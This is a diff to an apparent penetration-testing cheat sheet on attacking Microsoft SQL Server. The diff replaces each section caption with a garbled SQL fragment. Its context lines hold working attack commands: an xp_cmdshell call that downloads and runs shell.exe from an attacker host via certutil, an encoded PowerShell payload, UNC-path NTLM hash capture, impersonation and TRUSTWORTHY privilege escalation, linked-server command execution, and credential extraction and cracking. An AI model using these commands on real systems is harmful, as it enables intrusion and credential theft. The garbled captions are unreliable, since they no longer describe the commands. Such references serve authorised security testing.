@@ -3,7 +3,7 @@ id: "xn6jl9ay4mpn0ac7g"
 title: "mssql"
 description: ""
 tags: []
-order: 7
+order: "7"
 createdAt: "2026-05-26T19:06:12.940Z"
 updatedAt: "2026-05-26T19:06:31.486Z"
 ---
@@ -101,7 +101,7 @@ EXEC sp_helplinkedsrvlogin;
 SELECT * FROM sys.servers;
 ```
 
-_Enumeration (Authenticated) Enumerate databases, users, and configuration._
+_hash FROM sys.sql_
 
 **Tags:** mssql, enum, databases, users, authenticated, impacket
 <!-- cmd: {"id":"0razbfc8empn0aqf5","language":"sql","sectionId":"gkrbf2wukmpn0aqcv","tags":["mssql","enum","databases","users","authenticated","impacket"]} -->
@@ -127,7 +127,7 @@ EXEC sp_helpsrvrolemember 'sysadmin';
 SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
 ```
 
-_Tags: #mssql, #enum, #netexec, #privileges Check current user privileges._
+_SRVROLEMEMBER('db_
 
 **Tags:** mssql, privileges, enum, sysadmin, authenticated
 <!-- cmd: {"id":"3fxtu0466mpn0aqfc","language":"sql","sectionId":"gkrbf2wukmpn0aqcv","tags":["mssql","privileges","enum","sysadmin","authenticated"]} -->
@@ -149,7 +149,7 @@ EXEC xp_cmdshell 'powershell -e $BASE64_PAYLOAD';
 EXEC xp_cmdshell 'certutil -urlcache -split -f http://$LHOST/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe';
 ```
 
-_xp_cmdshell — OS Command Execution Enable and abuse xp_cmdshell for RCE._
+_configure 'xp_
 
 **Tags:** mssql, xp-cmdshell, rce, command-execution, privilege-escalation
 <!-- cmd: {"id":"1834rpcq7mpn0aqfo","language":"sql","sectionId":"jzen2y0qlmpn0aqcy","tags":["mssql","xp-cmdshell","rce","command-execution","privilege-escalation"]} -->
@@ -188,7 +188,7 @@ EXECUTE AS USER = 'dbo';
 SELECT USER_NAME();
 ```
 
-_Privilege Escalation Check and abuse IMPERSONATE privilege._
+_principals b ON a.grantor_
 
 **Tags:** mssql, impersonation, privilege-escalation, sysadmin, ad-abuse
 <!-- cmd: {"id":"aumy1x6zbmpn0aqg1","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","impersonation","privilege-escalation","sysadmin","ad-abuse"]} -->
@@ -208,7 +208,7 @@ EXEC sp_escalate;
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
-_Tags: #mssql, #impersonation, #privilege-escalation, #sysadmin, #ad-abuse Abuse db_owner role to escalate to sysadmin._
+_role, mp.name as database_
 
 **Tags:** mssql, db-owner, privilege-escalation, sysadmin, stored-procedure
 <!-- cmd: {"id":"rf88wwcsnmpn0aqg5","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","db-owner","privilege-escalation","sysadmin","stored-procedure"]} -->
@@ -228,7 +228,7 @@ CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS
 EXEC sp_privesc;
 ```
 
-_Tags: #mssql, #db-owner, #privilege-escalation, #sysadmin, #stored-procedure Abuse TRUSTWORTHY database property._
+_trustworthy_
 
 **Tags:** mssql, trustworthy, privilege-escalation, sysadmin, misconfiguration
 <!-- cmd: {"id":"rcqecxv6nmpn0aqg9","language":"sql","sectionId":"dgh6l33xbmpn0aqd1","tags":["mssql","trustworthy","privilege-escalation","sysadmin","misconfiguration"]} -->
@@ -257,7 +257,7 @@ EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [$LINKED_SERVER];
 EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
 ```
 
-_Linked Server Attacks Enumerate and abuse linked servers._
+_SERVER", 'SELECT SYSTEM_
 
 **Tags:** mssql, linked-servers, lateral-movement, rce, privilege-escalation
 <!-- cmd: {"id":"9fjy71bk2mpn0aqgk","language":"sql","sectionId":"b3pk0wxk8mpn0aqd5","tags":["mssql","linked-servers","lateral-movement","rce","privilege-escalation"]} -->
@@ -272,7 +272,7 @@ SELECT * FROM OPENQUERY([$LINKED_SERVER_1],
      'SELECT * FROM OPENQUERY([$LINKED_SERVER_2], ''SELECT SYSTEM_USER'')');
 ```
 
-_Tags: #mssql, #linked-servers, #lateral-movement, #rce, #privilege-escalation Chain multiple linked servers._
+_cmdshell ''''whoami''''; '') AT [$LINKED_
 
 **Tags:** mssql, linked-servers, lateral-movement, chaining, rce
 <!-- cmd: {"id":"snjf7fw0mmpn0aqgp","language":"sql","sectionId":"b3pk0wxk8mpn0aqd5","tags":["mssql","linked-servers","lateral-movement","chaining","rce"]} -->
@@ -292,7 +292,7 @@ SQL> EXEC xp_subdirs '\\$LHOST\share';
 SQL> SELECT * FROM fn_xe_file_target_read_file('\\$LHOST\share\*', NULL, NULL, NULL);
 ```
 
-_UNC Path Injection / Hash Capture Coerce MSSQL service account to authenticate to attacker — capture NTLM hash._
+_xe_
 
 **Tags:** mssql, unc-injection, hash-capture, responder, ntlm, credential-access
 <!-- cmd: {"id":"bhai31wzumpn0aqgw","language":"bash","sectionId":"zzwss752tmpn0aqd8","tags":["mssql","unc-injection","hash-capture","responder","ntlm","credential-access"]} -->
@@ -358,7 +358,7 @@ SELECT name, description FROM msdb.dbo.sysjobs;
 SELECT step_name, command FROM msdb.dbo.sysjobsteps;
 ```
 
-_Credential Access Extract credentials from MSSQL._
+_hash FROM sys.sql_
 
 **Tags:** mssql, credential-access, password-hash, linked-servers, agent-jobs
 <!-- cmd: {"id":"tqbcrt14empn0aqhe","language":"sql","sectionId":"c4xs0pxuimpn0aqdf","tags":["mssql","credential-access","password-hash","linked-servers","agent-jobs"]} -->
@@ -384,7 +384,7 @@ hashcat -m 131 mssql_hashes.txt rockyou.txt   # MSSQL 2000
 hashcat -m 132 mssql_hashes.txt rockyou.txt   # MSSQL 2005
 ```
 
-_Tags: #mssql, #credential-access, #netexec, #privileges Crack MSSQL password hashes._
+_hash, 2) FROM sys.sql_
 
 **Tags:** mssql, password-hash, hashcat, cracking, credential-access
 <!-- cmd: {"id":"hgsk94zzompn0aqhm","language":"bash","sectionId":"c4xs0pxuimpn0aqdf","tags":["mssql","password-hash","hashcat","cracking","credential-access"]} -->
@@ -443,7 +443,7 @@ EXEC xp_regread 'HKEY_LOCAL_MACHINE',
      'SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL';
 ```
 
-_Post-Exploitation Post-compromise MSSQL actions._
+_id, create_
 
 **Tags:** mssql, post-exploitation, data-exfiltration, sensitive-data, registry
 <!-- cmd: {"id":"dxl50xa7dmpn0aqi5","language":"sql","sectionId":"nuxkcualkmpn0aqdm","tags":["mssql","post-exploitation","data-exfiltration","sensitive-data","registry"]} -->
@@ -495,7 +495,7 @@ netexec mssql $TARGET -u $USER -p $PASS -x "SELECT distinct b.name FROM sys.serv
 netexec mssql $TARGET -u $USER -p $PASS -M mssql_priv
 ```
 
-_Misconfigurations Checklist Quick sweep for common MSSQL misconfigurations._
+_trustworthy_
 
 **Tags:** mssql, misconfiguration, checklist, sa, xp-cmdshell, trustworthy, impersonation, linked-servers
 <!-- cmd: {"id":"fwjdc8nkumpn0aqim","language":"bash","sectionId":"mbo9a3kulmpn0aqds","tags":["mssql","misconfiguration","checklist","sa","xp-cmdshell","trustworthy","impersonation","linked-servers"]} -->
